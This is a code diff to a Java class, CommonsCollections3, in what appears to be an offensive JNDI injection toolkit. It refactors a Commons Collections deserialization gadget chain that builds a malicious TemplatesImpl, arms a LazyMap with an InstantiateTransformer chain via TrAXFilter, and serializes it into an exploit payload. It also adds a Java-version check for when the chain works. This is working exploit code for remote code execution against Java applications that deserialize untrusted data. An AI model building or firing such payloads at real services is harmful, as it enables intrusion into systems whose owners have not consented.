@@ -2,6 +2,7 @@ package com.nu1r.jndi.gadgets;
 
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.gadgets.utils.Gadgets;
+import com.nu1r.jndi.gadgets.utils.JavaVersion;
 import com.nu1r.jndi.gadgets.utils.Reflections;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import org.apache.commons.collections.Transformer;
@@ -17,9 +18,14 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
 
-public class CommonsCollections3 {
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+/**
+ * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
+ * InvokerTransformer.
+ */
+public class CommonsCollections3 implements ObjectPayload<Object> {
+
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
         Object tpl = Gadgets.createTemplatesImpl(type, param);
 
         // inert chain for setup
@@ -32,13 +38,10 @@ public class CommonsCollections3 {
                         new Class[]{Templates.class},
                         new Object[]{tpl})};
 
-        final Map innerMap = new HashMap();
-
-        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-
-        final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
-
-        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
+        final Map               innerMap = new HashMap();
+        final Map               lazyMap  = LazyMap.decorate(innerMap, transformerChain);
+        final Map               mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
+        final InvocationHandler handler  = Gadgets.createMemoizedInvocationHandler(mapProxy);
 
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
 
@@ -50,5 +53,14 @@ public class CommonsCollections3 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
+    }
+
+    public static boolean isApplicableJavaVersion() {
+        return JavaVersion.isAnnInvHUniversalMethodImpl();
     }
 }
